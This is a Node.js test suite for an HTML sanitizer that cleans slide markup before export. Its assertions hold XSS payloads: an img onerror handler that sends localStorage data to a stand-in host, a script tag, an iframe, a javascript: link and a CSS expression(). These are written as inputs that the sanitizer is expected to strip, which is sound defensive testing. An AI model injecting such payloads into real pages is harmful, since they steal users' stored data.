const test = require('node:test');
const assert = require('node:assert/strict');

// The shared slide-HTML sanitizer LOGIC (lib/core/sanitize-slide-html.mjs) —
// extracted from docs so the .html EXPORT assembler can share it (2026-07-07
// §Security 1). It is ESM (.mjs) with ZERO external imports (DOMPurify is injected
// by the host); this CJS test reaches it via dynamic import(). This suite covers
// the Node EXPORT path — a real jsdom-backed purifier — which is what the export
// must do (the docs vitest suite covers the browser binding + its window-less
// no-op in docs/src/lib/sanitize-slide-html.js).

let sani; // a real Node sanitizer over a jsdom window (the export path)
let mod; // the shared module namespace

test.before(async () => {
	mod = await import('../../../lib/core/sanitize-slide-html.mjs');
	const DOMPurify = (await import('dompurify')).default;
	const { JSDOM } = await import('jsdom');
	sani = mod.createSlideSanitizer(DOMPurify, new JSDOM('').window);
});

test('createSlideSanitizer strips script vectors (real sanitization in Node)', () => {
	assert.equal(sani('<script>steal()</script><p>ok</p>'), '<p>ok</p>');
	assert.doesNotMatch(sani('<img src=x onerror="fetch(\'//e/?\'+localStorage.k)">'), /onerror/i);
	assert.doesNotMatch(sani('<svg><foreignObject><img src=x onerror=alert(1)></foreignObject></svg>'), /onerror/i);
	assert.equal(sani('<iframe src="//evil"></iframe><p>ok</p>'), '<p>ok</p>');
	assert.doesNotMatch(sani('<a href="javascript:alert(1)">x</a>'), /javascript:/i);
});

test('createSlideSanitizer strips the legacy script-in-style vector but keeps url()', () => {
	assert.doesNotMatch(sani('<div style="width:expression(alert(1))">x</div>'), /expression/i);
	assert.match(sani('<div class="lattice-bg" style="background-image:url(\'/a.svg\')"></div>'), /url\(/);
	assert.match(sani('<span class="logo-mark" style="--logo-mask:url(\'/l.svg\')"></span>'), /--logo-mask:url\(/);
});

test('createSlideSanitizer preserves legitimate engine output (chart SVG, MathML, tables, del/ins)', () => {
	assert.match(sani('<svg class="lattice-chart"><rect width="4" height="4"/></svg>'), /<svg/);
	assert.match(sani('<table><thead><tr><th>a</th></tr></thead></table>'), /<table>/);
	assert.equal(sani('<del>old</del><ins>new</ins><sup>1</sup><sub>2</sub>'), '<del>old</del><ins>new</ins><sup>1</sup><sub>2</sub>');
	assert.match(sani('<section class="lattice-slide"><h2>T</h2></section>'), /<h2>T<\/h2>/);
});

test('createSlideSanitizer returns falsy input unchanged (no throw on empty)', () => {
	assert.equal(sani(''), '');
});

test('FORBID_TAGS covers the never-legitimate tags (regression pin)', () => {
	for (const t of ['script', 'style', 'iframe', 'object', 'embed', 'form', 'input', 'base', 'link', 'meta']) {
		assert.ok(mod.FORBID_TAGS.includes(t), `FORBID_TAGS must include ${t}`);
	}
});
